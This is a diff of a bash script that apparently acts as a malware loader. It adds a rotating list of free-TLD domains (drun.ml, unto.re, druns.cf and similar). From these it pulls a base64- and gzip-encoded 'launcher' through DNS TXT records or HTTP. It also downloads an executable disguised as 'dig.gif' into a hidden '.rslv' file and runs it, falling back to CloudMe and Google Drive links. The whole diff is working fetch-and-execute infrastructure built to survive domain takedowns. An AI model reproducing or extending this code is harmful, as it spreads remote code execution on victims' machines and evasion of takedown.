@@ -44,62 +44,93 @@ querydns() {
     eval "$var=\$($digc @1.1.1.1) || $var=\$($digc @8.8.8.8) || $var=\$($digc)"
 }
 
+resolves() {
+    local d=$1
+    getent ahosts $d ||
+        host -t a $d ||
+        $dig a $d +short +tcp +timeout=3 +retries=0 ||
+        nslookup localhost $d
+}
+
+targets=(
+    "drun.ml"
+    "unto.re"
+    "druns.ml"
+    "drunt.ml"
+    "drunu.ml"
+    "drunv.ml"
+    "drunz.ml"
+    "druns.cf"
+    "drunt.cf"
+    "drunu.cf"
+    "drunv.cf"
+    "drunz.cf"
+    "druns.ga"
+    "drunt.ga"
+    "drunu.ga"
+    "drunv.ga"
+    "drunz.ga"
+    "druns.gq"
+    "drunt.gq"
+    "drunu.gq"
+    "drunv.gq"
+    "drunz.gq"
+)
+
 endpoints() {
+    data= launcher=
     chunksize=2047 # 1 char for order
-    zone=${lr_zone:-drun.ml}
-    record=${lr_record:-d}
-    querydns data
-    parsedata
-    launcher=${data}
-    launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
-    if [ -z "$launcher" ]; then
-        if host -t a ${zone}; then
-            endpoints_fallback launcher
+    try=-1
+    while [ -z "$launcher" ]; do
+        try=$((try+1)) ## before
+        if [ "$try" = 0 ]; then
+            zone=${lr_zone:-${targets[$try]}}
+            record=${lr_record:-d}
         else
-            zone=unto.re
-            querydns data
-            parsedata
-            launcher=${data}
-            launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
+            zone=${targets[$try]}
+            record=d
         fi
-    fi
-    # script_url=$(dig txt latest.drun.ml +short)
-    zone=${pl_zone:-drun.ml}
-    record=${pl_record:-plvars}
-    querydns pl_vars
-    pl_vars=${pl_vars/\"}
-    pl_vars=${pl_vars%\"}
-    pl_vars=${pl_vars//\\\"/\"}
-    if [ -z "$pl_vars" ]; then
-        if host -t a ${zone}; then
-            endpoints_fallback pl_vars
+        querydns data
+        parsedata
+        launcher=${data}
+        launcher=$(echo "$launcher" | $b64 -d -w $chunksize | gzip -d) ## can only gzip decode directly through pipe
+        if [ -z "$launcher" ]; then
+            if resolves "${zone}" ; then
+                endpoints_fallback launcher
+            fi
+        fi
+    done
+    while [ -z "$pl_vars" ]; do
+        if [ "$try" = 0 ]; then
+            zone=${pl_zone:-${targets[$try]}}
+            record=${pl_record:-plvars}
         else
-            zone=unto.re
-            querydns pl_vars
-            pl_vars=${pl_vars/\"}
-            pl_vars=${pl_vars%\"}
-            pl_vars=${pl_vars//\\\"/\"}
+            zone=${targets[$try]}
+            record=plvars
         fi
-    fi
+        try=$((try+1)) ## after
+        querydns pl_vars
+        pl_vars=${pl_vars/\"}
+        pl_vars=${pl_vars%\"}
+        pl_vars=${pl_vars//\\\"/\"}
+        if [ -z "$pl_vars" ]; then
+            if resolves "${zone}"; then
+                endpoints_fallback pl_vars
+            fi
+        fi
+    done
 }
 
 endpoints_fallback() {
     case "$1" in
         launcher)
-            script_url=${scr_url:-http://latest.drun.ml}
-            token_url=${tkn_url:-https://pl.drun.ml}
+            script_url=${scr_url:-"http://latest.${zone}"}
             data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
             [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
             launcher=${data}
-            if [ -z "$launcher" ]; then
-                script_url=latest.unto.re
-                token_url=pl.unto.re
-                data=$($b64 -d <<< "$(wget -t 3 -T 5 -q -i- -O- <<< "$script_url")")
-                [ -z "$data" ] && data=$(curl -L "$script_url" -s -o-)
-                launcher=${data}
-            fi
             ;;
         pl_vars)
+            token_url=${tkn_url:-"https://pl.${zone}"}
             pl_vars=$(echo "$token_url" | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
             pl_vars=${pl_vars#*\/}
             pl_vars=${pl_vars//\"&/\" }
@@ -110,17 +141,19 @@ endpoints_fallback() {
 
 filename=".rslv"
 getdig() {
-    ## try
-    digurl="http://pld.drun.ml/dig.gif"
-    wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
-    digv="$(./${filename} -v 2>&1)"
-    [ "${digv/DiG}" != "${digv}" ] && return
-    ## try
+    ## try targets
+    for t in ${targets[@]}; do
+        digurl="http://pld.${t}/dig.gif"
+        wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
+        digv="$(./${filename} -v 2>&1)"
+        [ "${digv/DiG}" != "${digv}" ] && return
+    done
+    ## try cloudme
     digurl="https://www.cloudme.com/v1/ws2/:fragia/:dig/dig"
     wget -t 2 -T 10 -q -i- -O- > ${filename} <<< "$digurl" && chmod +x ${filename}
     digv="$(./${filename} -v 2>&1)"
     [ "${digv/DiG}" != "${digv}" ] && return
-    ## try
+    ## try google
     fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
     gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
     gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="
